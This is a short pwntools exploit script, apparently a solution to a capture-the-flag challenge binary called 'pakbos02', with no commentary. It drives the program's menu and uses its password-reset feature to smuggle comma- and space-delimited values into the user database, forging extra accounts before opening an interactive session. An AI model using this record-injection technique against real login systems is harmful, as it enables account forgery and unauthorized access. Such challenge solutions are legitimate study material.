from pwn import *

p = process("./pakbos02")

def login(username, password):
    p.sendlineafter("> ", "1")
    p.sendlineafter("username: ", username)
    p.sendlineafter("password: ", password)

def logout():
    p.sendlineafter("> ", "2")

def forgot_password(password):
    p.sendlineafter("> ", "3")
    p.sendlineafter("(y/n): ", "y")
    p.sendlineafter("new password: ", password)

def save_db():
    p.sendlineafter("> ", "4")

def reset_db():
    p.sendlineafter("> ", "5")

def exploit():
    login("guest", "guest")
    for i in range(0, 253):
        forgot_password("guest 1,{},c".format(i))
        save_db()
        logout()
        login("{}".format(i), "c")

    forgot_password("guest 1,test,test 1,nope,nope")
    save_db()
    logout()
    login("nope", "nope")
    reset_db()
    p.sendlineafter("> ", "3")

    # gdb.attach(p)

    p.interactive()

if __name__ == "__main__":
    exploit()